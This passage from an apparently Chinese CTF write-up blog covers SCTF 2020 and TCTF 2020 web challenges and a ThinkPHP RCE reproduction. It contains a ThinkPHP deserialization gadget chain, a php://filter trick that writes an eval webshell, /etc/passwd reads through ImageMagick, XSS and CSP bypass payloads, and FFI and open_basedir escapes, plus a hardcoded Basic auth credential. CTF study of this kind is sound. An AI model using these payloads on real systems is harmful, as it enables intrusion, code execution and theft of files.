class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;styles = [<span class="string">&quot;getAttr&quot;</span>, <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;comment&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;question&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;highlight&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;warning&#x27;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query(<span class="string">&quot;xx&quot;</span>, <span class="string">&#x27;think\console\Output&#x27;</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;xx&quot;</span> =&gt; <span class="string">&quot;xx&quot;</span>];</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;test&quot;</span> =&gt; <span class="string">&quot;getError&quot;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;panrent&quot;</span> =&gt; <span class="string">&quot;true&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure>

<p>写文件到/tmp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload=requests.get(<span class="string">&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;</span>).text.strip()</span><br><span class="line">burp0_url = <span class="string">&quot;http://8.208.102.48:80/public/index.php&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&quot;s&quot;</span>:<span class="string">&quot;/index/Index/hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s3cr3tk3y&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">res=requests.get(burp0_url, headers=burp0_headers ,params=params)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">&quot;http://8.208.102.48:80/public/log.txt&quot;</span>).text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 8.208.102.48</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 155</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>写到文件里的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//000000000000</span><br><span class="line"> exit();?&gt;</span><br><span class="line">s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</span><br></pre></td></tr></table></figure>
<p>这里 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> 里面的方法已经不管用了，我们需要自己想出其他办法</p>
<p>这里我们用<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>来绕过死亡exit</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$backdoor</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = str_rot13(base64_encode(<span class="variable">$payload</span>));</span><br><span class="line"><span class="variable">$payload</span> = base64_decode(str_rot13(base64_encode(<span class="variable">$backdoor</span>)));</span><br><span class="line">assert(base64_decode(<span class="variable">$x</span>) === <span class="variable">$backdoor</span>);</span><br></pre></td></tr></table></figure>

<p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p>
<p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p>
<p>最后的payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 8.208.102.48</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 126</span><br><span class="line"></span><br><span class="line">file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/sctf2020/" data-id="cku8j3fi60062dan752jsb4k1" data-title="sctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/tctf2020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/tctf2020/">tctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>好难.jpg</p>
<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>这题在我们一堆人的群殴下才做出来</p>
<p>题目主要的http请求是：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p>
<p>与</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/image/VMyeGe/xxx</span><br><span class="line">xxx是后缀，具体列表在：https://imagemagick.org/script/formats.php</span><br></pre></td></tr></table></figure>





<h3 id="第一部分-ImageMagick读取文件"><a href="#第一部分-ImageMagick读取文件" class="headerlink" title="第一部分 ImageMagick读取文件"></a>第一部分 ImageMagick读取文件</h3><p>测试share发现，无论我们输入的previewid时候存在，都会生成一个短链</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p>
<p>访问对应的png界面时: <a target="_blank" rel="noopener" href="http://pwnable.org:5000//image/ZpVQfl/png">http://pwnable.org:5000//image/ZpVQfl/png</a> </p>
<p>返回报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#x27;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>根据报错猜测是ImageMagick 来转换成对应的后缀</p>
<p>fuzz后缀后发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/image/FdrpgF/htm</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p>
<p>根据preview返回的数据，后端估计是先生成一个svg,再转化为其他的格式</p>
<p>我们再看看他们是如何传递并表示表情的</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p>
<p>发现</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p>
<p>修改[]里的值可以逃出引号的限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;&#125;]</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p>
<p>搜索<strong>ImageMagick convert ctf</strong> 发现，ImageMagick convert可以<a target="_blank" rel="noopener" href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/">读取文件</a></p>
<p>构造:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryHJ88AZN7</span><br><span class="line">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class="line"></span><br><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;&#125;]</span><br><span class="line">------WebKitFormBoundaryHJ88AZN7--</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p>
<p>测试常见的文件后找到源文件：app.py</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p>
<p>这里我们重点关注responseJSON和 secret这两个函数</p>
<h3 id="第二部分-xss管理员"><a href="#第二部分-xss管理员" class="headerlink" title="第二部分 xss管理员"></a>第二部分 xss管理员</h3><p>secret是让我们xss管理员，但是存在csp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img-src * data:; default-src &#x27;self&#x27;; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; connect-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;</span><br></pre></td></tr></table></figure>



<p>responseJSON可以让我们在json数据前加上xxx=,结合报错返回的数据是json格式，如果我们能控制报错信息，我们就能绕过csp</p>
<p>前文发现 ImageMagick 的那个接口(share)刚好可以控制报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">previewid=`test&quot;&#125;,alert(1),&#123;&quot;2&quot;:&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p>
<p>接着就是让htm包含它：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p>
<h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>一叶飘零大大的wp：</p>
<p> <a target="_blank" rel="noopener" href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_GET[&#x27;rh&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;rh&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单的源代码,首先查看phpinfo:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p>
<p>open_basedir: /var/www/html 且该目录不可写，twitter上那个绕过open_basedir的方法就没用了</p>
<p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;</span><br></pre></td></tr></table></figure>

<p>列目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure>

<p>看到flag.h+flag.so+ffi猜测是要用ffi来加载flag.h然后执行其中的方法，</p>
<p>测试后发现 ffi::load 无视open_basedir ,但是只能加载 /flag.h</p>
<p>当我们又不知道flag.h中的函数定义。。。。。。</p>
<p>后来这题是因为别人把题目打穿了，全场绕过open_basedir，读取了flag</p>
<h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>这题听说是因为出题人因为easyphp重出的题目</p>
<p>这里就要直面刚刚明明无法读取flag.h又要了解flag.h中的函数声明</p>
<p>因为这里有ffi，可以直接操作系统的底层，我们试试内存泄露</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=FFI::load(<span class="string">&quot;/flag.h&quot;</span>);</span><br><span class="line"><span class="variable">$b</span>=FFI::cast(<span class="string">&quot;void *&quot;</span>,FFI::new(<span class="string">&quot;int[1]&quot;</span>,<span class="literal">false</span>));</span><br><span class="line"><span class="variable">$a</span>=FFI::string(<span class="variable">$b</span>-<span class="number">400000</span>,<span class="number">400000</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p>
<p>好玩.jpg</p>
<h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> mkdir(<span class="string">&#x27;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#x27;</span>);chdir(<span class="string">&#x27;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/tctf2020/" data-id="cku8j3fi80066dan77eyef2jf" data-title="tctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tp5rce复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="tp5rce复现"><a href="#tp5rce复现" class="headerlink" title="tp5rce复现"></a>tp5rce复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
<h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。</h3><p><strong>如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。</strong></p>
<p>–来自thinkphp官网</p>
</blockquote>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据官方的公告去寻找相关commit发现漏洞位置</p>
<p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p>
<p>查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 监听module_init</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 实例化控制器</span></span><br><span class="line">           <span class="variable">$instance</span> = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">               <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">               <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">               <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$instance</span> <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">               <span 